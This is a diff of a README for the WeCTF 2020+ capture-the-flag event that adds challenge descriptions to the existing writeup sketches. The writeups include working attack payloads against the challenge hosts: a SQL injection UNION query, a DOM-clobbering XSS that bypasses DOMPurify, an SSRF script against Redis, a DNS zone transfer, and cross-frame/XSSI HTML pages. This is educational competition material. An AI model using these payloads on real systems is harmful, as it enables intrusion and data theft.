@@ -1,9 +1,11 @@
 # WeCTF 2020+
+
 Thank you all for participating! This README contains our writeup sketches. You can also share your writeup on CTFtime.
 
 Event Link: https://ctftime.org/event/1072
 
 ### Run Challenges Locally
+
 ```shell
 git clone https://github.com/wectf/2020p
 cd 2020p && docker-compose up
@@ -20,17 +22,39 @@ localhost:8005 -> Notebin
 localhost:8006 -> Wallet
 ```
 
-### babyrev Writeup
+### babyrev
+
+**Description**
+
+Shou only allows his gay friends to view the flag here. We got intels that he used PHP extension for access control and we retrieved a weird binary.
+
+Handout: https://github.com/wectf/2020p/blob/master/babyrev/babyrev.so
+
 Author: @qisu
+
+**Writeup**
 
 The extension compares requests' user-agent with string "Flag Viewer 2.0".
 
 PoC:
+
 ```bash
 curl -H "User-Agent: Flag Viewer 2.0" [HOST]
 ```
 
-### Red Team Writeup
+### Red Team
+
+**Description**
+
+We overheard that Shou's company hoarded a shiny flag at a super secret subdomain.
+
+His company's domain: shoustinycompany.cf (Challenge is down now)
+
+Note: You are allowed to use subdomain scanner in this challenge.
+
+
+**Writeup**
+
 Step 1: Do a subdomain scan and you would discover `docs.shoustinycompany.cf`
 
 Step 2: You find a few files at that subdomain indicating we need to perform an AXFR attack at 161.35.126.226. 
@@ -61,8 +85,26 @@ dig AXFR shoustinycompany.cf @ns1.shoustinycompany.cf
 ```
 
 
-### KVCloud Writeup
+### KVCloud 
+
+**Description**
+
+Shou hates to use Redis by TCPing it. He instead built a HTTP wrapper for saving his key-value pairs.
+
+Flag is at /flag.txt.
+
+Hint: How to keep-alive a connection?
+
+Note 1: Remote is not using 127.0.0.1 as Redis host.
+
+Note 2: Try different host if your payload is not working remotely.
+
+Handout: https://github.com/wectf/2020p/blob/master/kvcloud/handout.zip
+
+**Writeup**
+
 SSRF with Connection: keep-alive:
+
 ```python3
 from requests import *
 import urllib
@@ -80,14 +122,37 @@ print("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload))
 ```
 
 
-### dont-bf-me Writeup
+### dont-bf-me 
+
+**Description**
+
+Shou uses Recaptcha for his site to make it "safer".
+
+Hint: The password is so long that makes any bruteforcing method impotent.
+
+Handout: https://github.com/wectf/2020p/blob/master/dont-bf-me/handout.zip
+
+**Writeup**
+
 `parse_str` in login.php could overwrite $RECAPTCHA_URL and $CORRECT_PASSWORD. 
 
 
-### Hashtable Writeup
+### Hashtable
+
+**Description**
+
+Universal hashing could prevent hackers from DoSing the hash table by creating a lot of collisions. Shou doubt that. Prove him correct by DoSing this hash table implemented with universal hashing.
+
+Note: having 10 collisions at the same slot would give you the flag
+
+Handout: https://github.com/wectf/2020p/blob/master/hashtable/handout.zip
+
+**Writeup**
+
 Pseudo Random Number PoC:
 
 Save following file as main.go and run `go run main.go [TIMESTAMP]`.
+
 ```go
 package main
 
@@ -157,26 +222,59 @@ func main() {
 ```
 
 
-### Hall of Fame Writeup
+### Hall of Fame
+
+**Description**
+
+We made a Slack bot (@hof) to remember our past winners. Hope no one hacks it cuz we are running it on a really important database.
+
+Handout: https://github.com/wectf/2020p/tree/master/hof
+
+**Writeup**
+
 SQL Injection
 
 Send following content to @hof would yield the flag:
+
 ```
 rank x') UNION SELECT 1,1,(SELECT flag from flags LIMIT 1) ---
 ```
 
-### Notebin Writeup
+### Notebin 
+
+**Description**
+
+Here is where Shou keeps his pathetic diaries and a shinny flag.
+
+**Writeup**
+
 DOM Clobbering => XSS
 
 Set title as following could make content bypass DOMPurify.
+
 ```html
 <a id="_debug"></a><a id="_debug" name="key" href="sha1:f03e8a370aa8dc80f63a6d67401a692ae72fa530"></a>
 ```
 
 ### Wallet Writeup
+
+**Description**
+
+Shou has a habit of saving secret (i.e. flag) in the blockchain. Here is where he stores his bitcoin addresses.
+
+Note: wrap what you find on blockchain with we{.....}
+
+Hint 1: You should leak the bitcoin address in Shou's wallet first.
+
+Hint 2: Shou is using Firefox. Firefox does not have CORB.
+
+Handout: https://github.com/wectf/2020p/blob/master/wallet/handout.zip
+
+**Writeup**
 XFS + XSSI + Some recon
 
 0.html:
+
 ```html
 <form action="http://[HOST]/address" method="post" id="f">
     <input name="address" value='xxxx"'/>
@@ -188,6 +286,7 @@ XFS + XSSI + Some recon
 ```
 
 1.html
+
 ```html
 <form action="http://[HOST]/style" method="post" id="f">
     <input name="style" value='"Raw'/>
@@ -199,6 +298,7 @@ XFS + XSSI + Some recon
 ```
 
 2.html
+
 ```html
 <div id=iframe2></div>
 <div id=iframe3></div>
@@ -234,6 +334,17 @@ Save 0.html, 1.html, 2.html and send 2.html as payload.
 After getting the bitcoin address, you can find flag in OP_RETURN of one transaction. 
 
 ### Wordpress
+
+**Description**
+
+Shou made his first wordpress plugin! Check it out!
+
+Note 1: it is unnecessary to be admin to solve this challenge and to ensure the stability, we removed almost all possible ways to be admin.
+
+Handout: https://github.com/wectf/2020p/blob/master/wordpress/handout.zip
+
+**Writeup**
+
 Wordpress Entry Overwrite + Unsafe Deserialization 
 
 ```python
